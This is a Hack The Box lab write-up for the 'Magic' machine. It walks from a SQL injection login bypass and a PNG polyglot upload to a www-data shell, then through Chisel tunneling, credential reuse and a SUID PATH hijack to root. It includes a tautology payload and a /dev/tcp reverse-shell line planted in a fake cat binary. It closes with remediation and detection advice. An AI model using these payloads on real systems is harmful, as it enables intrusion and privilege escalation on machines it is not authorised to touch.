---
title: "Magic — SQL Injection and Magic-Byte Upload Bypass to SUID PATH Hijack"
description: "SQL injection in a login page and PNG magic-byte upload evasion provide a foothold; MySQL credentials tunneled through Chisel and reused admin credentials enable lateral movement, and a SUID sysinfo binary is hijacked through PATH to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - sql-injection
  - privilege-escalation
objective: "Move from unauthenticated web access through a SQL injection login bypass and a magic-byte upload evasion to root via a SUID binary PATH hijack."
tools:
  - rustscan
  - nmap
  - feroxbuster
  - penelope
  - chisel
  - mysql
  - suid3num
  - strings
skill: "Web application exploitation and Linux privilege escalation via a SUID PATH hijack"
outcome: "Command execution as `www-data` through upload evasion and a root context via the SUID `/bin/sysinfo` PATH hijack"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux (Ubuntu 18.04); Apache httpd 2.4.29 hosting a PHP web application |
| Starting position | Unauthenticated network access |
| Objective | Move from unauthenticated web access through a SQL injection login bypass and a magic-byte upload evasion to root via a SUID binary PATH hijack |
| Outcome | `www-data` command execution; root context via the SUID `/bin/sysinfo` PATH hijack |

## From SQL injection to SUID PATH hijack

Magic is a Medium-rated Hack The Box Linux lab whose PHP portfolio application exposes a SQL injection flaw in its login page, an upload panel that validates files by magic bytes, and a SUID binary that invokes system commands through `PATH`. Chaining these flaws turns unauthenticated web access into a root shell using only the injection and the local misconfiguration. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **SQL injection login bypass → admin upload panel → PNG magic-byte upload evasion → `www-data` reverse shell → plaintext database credentials → Chisel-tunneled MySQL → admin credential recovery → password reuse for `<LAB_USER>` → SUID `/bin/sysinfo` PATH hijack → root**

## Ubuntu Apache and PHP host from unauthenticated access

- **Target:** Linux (Ubuntu 18.04) running Apache httpd 2.4.29 with a PHP web application.
- **Exposed services:** SSH (22) and HTTP (80).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** convert a web application foothold into a stable shell, then follow exposed credentials and a privileged local binary to root.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: SQL bypass to SUID PATH hijack

### 1. Service Enumeration

Observation: a full TCP scan exposes two services.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Magic-TCP
```

Truncated scan output:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
```

Significance: HTTP hosts the "Magic Portfolio" site, while SSH offers a remote shell but no credential path yet, so the web application is the initial attack surface. The banners identify the platform and web server versions.

Result: SSH and Apache HTTP are exposed on an Ubuntu host.

### 2. Web Content Discovery

Observation: directory enumeration uncovers a login page.

```bash
feroxbuster --url http://<TARGET_IP> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

Truncated discovery output:

```text
http://<TARGET_IP>/login.php
```

Significance: an authenticated login form gates the application's privileged functionality.

Result: a login page is reachable at `/login.php`.

### 3. SQL Injection Authentication Bypass

Observation: the login form is vulnerable to SQL injection, so an authentication clause can be forced true.

Action:

```sql
' OR '1'='1
```

Significance: a tautology payload defeats the login check when input is concatenated into a query instead of parameterized. The notes record access to the admin panel and its upload page at `/upload.php`; the bypass response is not reproduced here.

Result: the login check is bypassed and the upload page is reachable.

### 4. File Upload Restriction Bypass

Observation: the upload page accepts only image types (`JPG`, `JPEG`, `PNG`), judging by file magic bytes rather than extension alone.

Action: a PHP payload is wrapped with a PNG signature so it satisfies the content check.

```bash
python3 <FORGE_SCRIPT> forge --payload-file revshell.php -t png -o fakepic.php.png
```

```text
Wrote: fakepic.png
Signature: png (image/png)
Payload bytes: 2585
Total bytes: 2594
```

Significance: validating content type by magic bytes alone does not prevent a polyglot file that is simultaneously a valid image and executable PHP.

Result: a PNG-signature file carrying the PHP payload is produced.

### 5. Reverse Shell

Observation: once the forged file is reachable under the web root, requesting it executes the embedded PHP.

Action: start a handler, then request the uploaded file at `http://<TARGET_IP>/images/uploads/fakepic.php.png`.

```bash
penelope -p <LISTENER_PORT>
```

```text
www-data@<TARGET_HOST>
```

Significance: the upload directory serves and executes PHP, so an uploaded file becomes code execution in the web server account.

Result: a reverse shell as `www-data` is obtained.

### 6. Database Configuration Disclosure

Observation: I checked the application configuration file and found the database credentials stored in plaintext.

```bash
cat /var/www/Magic/db.php5
```

```php
private static $dbUsername = '<DB_USER>';
private static $dbUserPassword = '<DB_PASSWORD>';
```

The database listens only on loopback, so it is not directly reachable:

```bash
ss -tulpn
```

```text
tcp    LISTEN   0   80   127.0.0.1:3306   0.0.0.0:*
```

Significance: a plaintext database credential inside the web root is directly usable once the service becomes reachable; binding MySQL to `127.0.0.1` removes direct external access but not access from the host.

Result: database credentials are recovered, and the database is confirmed to listen only on loopback.

### 7. MySQL Tunneling via Chisel

Observation: because MySQL listens only on `127.0.0.1`, a reverse tunnel forwards that port to the attack machine.

Action:

```bash
# On the attacker host
chisel server --reverse -p <CHISEL_PORT>
```

```bash
# On the target
./chisel client <ATTACKER_HOST>:<CHISEL_PORT> R:13306:127.0.0.1:3306
```

The tunneled service is then reachable locally:

```bash
mysql -h 127.0.0.1 -P 13306 -u <DB_USER> -p
```

```text
Enter password: <DB_PASSWORD>
```

Significance: a reverse tunnel exposes a loopback-only service to the attack machine, turning a local-only database into a remote target without any firewall change.

Result: the tunneled MySQL instance is reachable and accepts the recovered database credentials.

### 8. Database Enumeration

Observation: the application database contains an account table.

```sql
show databases;
USE Magic;
SHOW TABLES;
DESCRIBE login;
SELECT * FROM login;
```

```text
+----+----------+-----------------+
| id | username | password        |
+----+----------+-----------------+
|  1 | <ADMIN_USER> | <ADMIN_PASSWORD> |
+----+----------+-----------------+
```

Significance: the application stores account passwords in plaintext, so database access yields the administrative credential.

Result: the admin credential is recovered from the `login` table.

### 9. Lateral Movement to `<LAB_USER>`

Observation: the password recovered from the `login` table is reused for a system account.

```bash
su - <LAB_USER>
```

```text
Password: <ADMIN_PASSWORD>
```

```text
<LAB_USER>@<TARGET_HOST>:~$
```

Significance: reusing an application credential for a system account turns database access into shell access, so a leaked application secret grants an interactive account.

Result: a shell as `<LAB_USER>` is obtained.

### 10. SUID Binary Discovery

Observation: SUID enumeration finds a non-standard setuid binary.

```bash
python3 suid3num.py
```

```text
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/bin/sysinfo
------------------------------
```

Significance: a custom setuid binary runs with elevated privileges and is the local escalation target.

Result: `/bin/sysinfo` is identified as a custom SUID binary.

### 11. PATH Hijack to Root

Observation: `strings` shows the binary invokes system utilities by bare name, relying on `PATH`.

```bash
strings /bin/sysinfo
```

```text
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
```

Action: prepend a writable directory containing a malicious `cat` to `PATH`, then run the binary.

```bash
export PATH=/tmp:$PATH
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_HOST>/<LISTENER_PORT> 0>&1"' > /tmp/cat
chmod +x /tmp/cat
sysinfo
```

```text
root@<TARGET_HOST>:/#
```

Significance: a setuid program that resolves commands through the inherited `PATH` executes whatever the caller places first, so a low-privileged account can supply a replacement binary and gain the program's privileges.

Result: the callback returns a root shell, confirmed by the root prompt.

## Loopback MySQL, magic-byte checks, and the SUID binary

| Challenge | Decision | Rationale |
|---|---|---|
| MySQL listened only on `127.0.0.1` | Forwarded the port over a Chisel reverse tunnel | The database is not directly reachable from the attack machine |
| Upload validation compared magic bytes, not extensions | Wrapped the PHP payload with a PNG signature | An extension rename alone would not satisfy the content check |
| `/bin/sysinfo` invoked `cat` without an absolute path | Prepended `/tmp` to `PATH` and supplied a `cat` replacement | The binary resolves commands through the inherited `PATH` |

## Outcome: root from unauthenticated web access

The case reaches a root context on the target from unauthenticated web access.

## Recommendations: injection, upload validation, secrets, reuse, and SUID PATH

These actions are recommendations, and no validation is documented.

1. **SQL injection in the login form.** User input reached the authentication query without parameterization, so a tautology payload authenticated as an administrator. *Recommendation:* use parameterized queries or prepared statements. *Detection:* alert when authentication requests contain SQL metacharacters.
2. **Upload validation by magic bytes only.** The upload panel accepted a file based on its leading signature, so a PHP payload wrapped with a PNG header executed from the upload directory. *Recommendation:* validate extension and content together, store uploads outside the web root, and disable script execution in upload directories. *Detection:* monitor upload directories for newly written executable files.
3. **Plaintext database credentials in the application.** The configuration file stored the database password in cleartext, yielding database access from a web foothold. *Recommendation:* keep secrets out of the web root and load them from a secrets manager or a restricted environment file. *Detection:* scan web-accessible files for credential-shaped strings.
4. **Credential reuse between tiers.** An application account password also authenticated a system account. *Recommendation:* issue unique credentials per account and service. *Detection:* alert when a system account authenticates with a credential associated with an application.
5. **SUID binary resolving commands through `PATH`.** `/bin/sysinfo` invoked `cat` by name, so a caller-controlled `PATH` redirected execution. *Recommendation:* call external commands by absolute path in privileged binaries and reset `PATH` to a trusted value. *Validation:* inventory SUID binaries and review them for unqualified command invocations.

## References

- [Hack The Box — Magic](https://app.hackthebox.com/machines/Magic) (retired machine)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner wrapping Nmap)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
- [Penelope](https://github.com/brightio/penelope) (reverse-shell handler)
- [Chisel](https://github.com/jpillora/chisel) (TCP tunnel over HTTP)
- [MySQL Client — `mysql` command](https://dev.mysql.com/doc/refman/8.0/en/mysql.html)
- [suid3num](https://github.com/Anon-Exploiter/SUID3NUM) (SUID enumeration)
- [GNU Binutils — `strings`](https://man7.org/linux/man-pages/man1/strings.1.html)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
